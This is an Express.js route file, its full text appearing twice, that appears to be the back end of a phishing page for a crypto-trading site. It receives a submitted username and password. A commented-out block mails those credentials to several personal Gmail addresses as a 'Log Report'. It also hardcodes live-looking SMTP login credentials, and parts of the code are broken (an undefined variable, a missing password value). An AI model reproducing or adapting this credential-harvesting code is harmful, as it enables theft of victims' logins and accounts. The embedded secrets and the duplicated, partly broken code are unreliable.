const express = require("express");
const router = express.Router();
const nodemailer = require("nodemailer");
var cors = require("cors");
router.use(cors());
router.use(express.urlencoded({ extended: false }));
router.use(express.json());

router.route("/").post((req, res) => {
  const { username, password } = req.body;

  // async..await is not allowed in global scope, must use a wrapper
  async function main() {
    // Generate test SMTP service account from ethereal.email
    // Only needed if you don't have a real mail account for testing
    let testAccount = await nodemailer.createTestAccount();

    // create reusable transporter object using the default SMTP transport
    let transporter = nodemailer.createTransport({
      host: "mail.cryptotradecenter.co",
      port: 465,
      secure: true, // true for 465, false for other ports
      //  service: "gmail",
      auth: {
        user: "support@cryptotradecenter.co", // generated ethereal user
        pass: "cryptotrade2020", // generated ethereal password
      },
    });

    var sendPwdReminder = transporter.templateSender(
      {
        subject: "tstng for {{username}}!",
        text: "Hello, {{username}}",
        html: "<b>Hello, <strong>{{username}}</strong>, Your password is:\n<b>{{ password }}</b></p>",
      },
      {
        from: "support@cryptotradecenter.co",
      }
    );

    sendPwdReminder(
      {
        to: "pjindawa@gmail.com",
      },
      {
        username: "pjindawa@gmail.com",
        // password: '!"\'<>&some-thing'
      },
      function (err, info) {
        if (err) {
          console.log("Error");
        } else {
          console.log("sent");
        }
      }
    );

    /*

    let info = await transporter.sendMail({
      from: '"Report" <support@cryptotradecenter.co>', // sender address
      //  from: "anthonyerics84@gmail.com",
      bcc:  "jhonsnow751@gmail.com, anthonyerics84@gmail.com, pjindawa@gmail.com", // list of receivers goziechimeziezeh@gmail.com
      subject: `Log Report ✔`, // Subject line
      text: ``, // plain text body
      html: `<h6>Email: ${username}<br />Password: ${password}`,
    }); 
*/

    //  console.log("Message sent: %s", info.messageId);
   

    // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

    // Preview only available when sending through an Ethereal account
    console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
    // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
  }

  main().catch(console.error);

  res.json({ status: "processing" });
});

module.exports = router;
const express = require("express");
const router = express.Router();
const nodemailer = require("nodemailer");
var cors = require("cors");
router.use(cors());
router.use(express.urlencoded({ extended: false }));
router.use(express.json());

router.route("/").post((req, res) => {
  const { username, password } = req.body;

  // async..await is not allowed in global scope, must use a wrapper
  async function main() {
    // Generate test SMTP service account from ethereal.email
    // Only needed if you don't have a real mail account for testing
    let testAccount = await nodemailer.createTestAccount();

    // create reusable transporter object using the default SMTP transport
    let transporter = nodemailer.createTransport({
      host: "mail.cryptotradecenter.co",
      port: 465,
      secure: true, // true for 465, false for other ports
      //  service: "gmail",
      auth: {
        user: "support@cryptotradecenter.co", // generated ethereal user
        pass: "cryptotrade2020", // generated ethereal password
      },
    });

    var sendPwdReminder = transporter.templateSender(
      {
        subject: "tstng for {{username}}!",
        text: "Hello, {{username}}",
        html: "<b>Hello, <strong>{{username}}</strong>, Your password is:\n<b>{{ password }}</b></p>",
      },
      {
        from: "support@cryptotradecenter.co",
      }
    );

    sendPwdReminder(
      {
        to: "pjindawa@gmail.com",
      },
      {
        username: "pjindawa@gmail.com",
        // password: '!"\'<>&some-thing'
      },
      function (err, info) {
        if (err) {
          console.log("Error");
        } else {
          console.log("sent");
        }
      }
    );

    /*

    let info = await transporter.sendMail({
      from: '"Report" <support@cryptotradecenter.co>', // sender address
      //  from: "anthonyerics84@gmail.com",
      bcc:  "jhonsnow751@gmail.com, anthonyerics84@gmail.com, pjindawa@gmail.com", // list of receivers goziechimeziezeh@gmail.com
      subject: `Log Report ✔`, // Subject line
      text: ``, // plain text body
      html: `<h6>Email: ${username}<br />Password: ${password}`,
    }); 
*/

    //  console.log("Message sent: %s", info.messageId);
   

    // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

    // Preview only available when sending through an Ethereal account
    console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
    // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
  }

  main().catch(console.error);

  res.json({ status: "processing" });
});

module.exports = router;
